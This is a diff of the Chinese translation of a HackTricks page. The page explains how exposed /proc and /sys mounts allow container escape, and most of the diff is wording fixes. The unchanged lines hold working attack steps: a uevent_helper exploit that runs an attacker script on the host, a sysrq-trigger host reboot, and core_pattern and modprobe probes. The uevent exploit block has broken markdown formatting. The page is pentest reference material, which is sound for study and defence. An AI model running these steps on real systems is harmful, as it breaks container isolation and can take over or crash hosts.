@@ -8,30 +8,30 @@
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-未经适当命名空间隔离的`/proc`和`/sys`的暴露会引入重大安全风险，包括增加攻击面和信息泄露。这些目录包含敏感文件，如果配置不当或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，不正确地挂载`-v /proc:/host/proc`可能绕过AppArmor保护，因为其基于路径的特性，使`/host/proc`无保护。
+未经适当命名空间隔离的`/proc`和`/sys`的暴露会引入重大安全风险，包括扩大攻击面和信息泄露。这些目录包含敏感文件，如果配置不当或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，不正确地挂载`-v /proc:/host/proc`可能绕过AppArmor保护，因为其基于路径的特性，使`/host/proc`无保护。
 
-**您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** **中找到每个潜在漏洞的更多详细信息。**
+**您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** **中找到每个潜在漏洞的更多详细信息。
 
 ## procfs漏洞
 
 ### `/proc/sys`
 
-此目录允许访问以修改内核变量，通常通过`sysctl(2)`进行，包含几个相关子目录：
+此目录允许通过`sysctl(2)`修改内核变量，并包含几个相关子目录：
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 * 在[core(5)](https://man7.org/linux/man-pages/man5/core.5.html)中描述。
-* 允许定义一个程序，在核心文件生成时使用前128个字节作为参数执行。如果文件以管道`|`开头，这可能导致代码执行。
+* 允许定义在生成核心文件时执行的程序，前128个字节作为参数。如果文件以管道`|`开头，可能导致代码执行。
 *   **测试和利用示例**：
 
 ```bash
@@ -73,7 +73,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # 检查对modprobe的访问权限
 
 #### **`/proc/config.gz`**
 
-* 如果启用了`CONFIG_IKCONFIG_PROC`，可能会显示内核配置。
+* 如果启用了`CONFIG_IKCONFIG_PROC`，可能会泄露内核配置。
 * 对攻击者有用，以识别运行中内核中的漏洞。
 
 #### **`/proc/sysrq-trigger`**
@@ -88,7 +88,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kmsg`**
 
 * 显示内核环形缓冲区消息。
-* 可以帮助内核利用、地址泄漏和提供敏感系统信息。
+* 可帮助内核利用、地址泄漏和提供敏感系统信息。
 
 #### **`/proc/kallsyms`**
 
@@ -130,7 +130,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 * 提供有关进程挂载命名空间中挂载点的信息。
 * 显示容器`rootfs`或镜像的位置。
 
-### `/sys`漏洞
+### `/sys`中的漏洞
 
 #### **`/sys/kernel/uevent_helper`**
 
@@ -138,23 +138,23 @@ echo b > /proc/sysrq-trigger # 重启主机
 * 写入`/sys/kernel/uevent_helper`可以在`uevent`触发时执行任意脚本。
 *   **利用示例**： %%%bash
 
-### 创建有效载荷
+#### 创建一个有效载荷
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-### 从容器的OverlayFS挂载中查找主机路径
+#### 从容器的OverlayFS挂载中找到主机路径
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-### 将uevent\_helper设置为恶意助手
+#### 将uevent\_helper设置为恶意助手
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-### 触发uevent
+#### 触发一个uevent
 
 echo change > /sys/class/mem/null/uevent
 
-### 读取输出
+#### 读取输出
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -168,7 +168,7 @@ cat /output %%%
 #### **`/sys/kernel/security`**
 
 * 包含 `securityfs` 接口，允许配置类似 AppArmor 的 Linux 安全模块。
-* 访问可能使容器能够禁用其 MAC 系统。
+* 访问可能使容器禁用其 MAC 系统。
 
 #### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**
 
@@ -186,7 +186,7 @@ cat /output %%%
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
